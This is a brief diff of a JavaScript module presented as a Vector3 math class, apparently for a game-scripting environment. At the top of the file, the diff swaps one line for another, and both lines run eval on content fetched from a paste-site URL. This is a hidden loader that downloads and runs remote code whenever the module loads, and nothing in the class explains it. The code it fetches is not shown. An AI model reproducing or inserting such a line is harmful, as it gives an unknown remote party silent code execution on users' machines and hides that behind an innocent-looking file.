@@ -1,4 +1,4 @@
-eval(FileLib.getUrlContent("https://hst.sh/raw/fozojuhuvu"))
+eval(FileLib.getUrlContent("https://hst.sh/raw/ihoqatodey"))
 export default class Vector3 {
     
     static fromCoords = (x0, y0, z0, x1, y1, z1) => new Vector3(x1-x0, y1-y0, z1-z0)
